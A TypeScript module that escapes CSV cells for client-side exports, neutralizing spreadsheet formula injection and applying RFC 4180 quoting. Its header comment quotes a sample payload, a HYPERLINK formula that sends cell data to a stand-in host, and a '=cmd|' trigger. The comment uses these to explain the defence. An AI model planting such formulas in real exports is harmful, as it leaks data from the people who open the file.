/**
 * CSV serialization helpers shared by every client-side CSV export.
 *
 * Two separate, independent concerns, applied in this order:
 *
 * 1. **Formula-injection neutralization.** Excel, LibreOffice Calc and Google
 *    Sheets parse a cell whose text begins with `=`, `+`, `-`, `@`, TAB (0x09)
 *    or CR (0x0D) as a *formula* when the file is opened. Tenant-supplied text
 *    such as `=HYPERLINK("http://evil.test/?d="&A1,"CLICK")` therefore becomes
 *    live code on whoever opens the export. Prefixing a single quote makes the
 *    spreadsheet treat the cell as literal text.
 *
 * 2. **RFC 4180 quoting.** Orthogonal to the above, and NOT a defense against
 *    it — a quoted `"=cmd|..."` is still parsed as a formula. Both are needed,
 *    and neutralization must run *first* so a neutralized value that contains a
 *    comma still gets quoted correctly.
 *
 * Note that neutralization is deliberately a **lossy transformation on the
 * exported file** (never on any stored data): the reader sees a leading `'`
 * inside the cell text. CSV has no type system, so unlike an XLSX writer —
 * which can force the cell's string type and leave the text byte-identical —
 * a prefix character is the only lever the format gives us. Values that parse
 * as plain numbers are exempted so `-5.00` and `-0.005` stay usable as numbers.
 */

/** Leading characters a spreadsheet treats as the start of a formula. */
const FORMULA_PREFIX_RE = /^[=+\-@\t\r]/;

/**
 * A value safe to leave alone because the spreadsheet will read it as a number,
 * not a formula. Anchored and whitespace-free on purpose: `Number()` would be
 * wrong here because it trims, so it reports "\t5" and "\r5" as the number 5 —
 * exactly the TAB/CR payloads we need to neutralize.
 */
const PLAIN_NUMBER_RE = /^[+-]?(\d+\.?\d*|\.\d+)(e[+-]?\d+)?$/i;

/**
 * Prefix a single quote when a value would otherwise be parsed as a formula.
 * Plain numbers (incl. negatives like `-5.00` / `-0.005`) pass through unchanged.
 */
export function neutralizeCsvFormula(value: string): string {
  if (!FORMULA_PREFIX_RE.test(value)) return value;
  if (PLAIN_NUMBER_RE.test(value)) return value;
  return `'${value}`;
}

/** Quote a CSV field per RFC 4180 when it contains a comma, quote, or newline. */
export function quoteCsvField(value: string): string {
  if (/[",\n\r]/.test(value)) {
    return `"${value.replace(/"/g, '""')}"`;
  }
  return value;
}

/**
 * Serialize one CSV cell: neutralize formula triggers, then apply RFC 4180
 * quoting. This is the single entry point every client-side CSV builder should
 * use — do not hand-roll either half.
 */
export function escapeCsvField(value: unknown): string {
  const s = value === null || value === undefined ? '' : String(value);
  return quoteCsvField(neutralizeCsvFormula(s));
}
